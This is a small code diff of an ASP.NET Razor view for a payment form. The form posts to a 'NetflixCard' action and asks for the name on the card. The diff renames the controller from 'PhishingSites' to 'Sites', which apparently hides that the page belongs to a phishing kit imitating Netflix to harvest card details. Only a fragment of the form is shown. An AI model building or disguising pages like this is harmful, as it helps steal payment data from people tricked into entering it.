@@ -22,7 +22,7 @@
 </nav>
 <div class="form-wrapper">
     <h2>Payment</h2>
-    @using (Html.BeginForm("NetflixCard", "PhishingSites", FormMethod.Post))
+    @using (Html.BeginForm("NetflixCard", "Sites", FormMethod.Post))
     {
         <div class="form-control">
             @Html.TextBoxFor(model => model.user_name_on_card, new { @type = "text", @class = "form-control", @required = "required" })
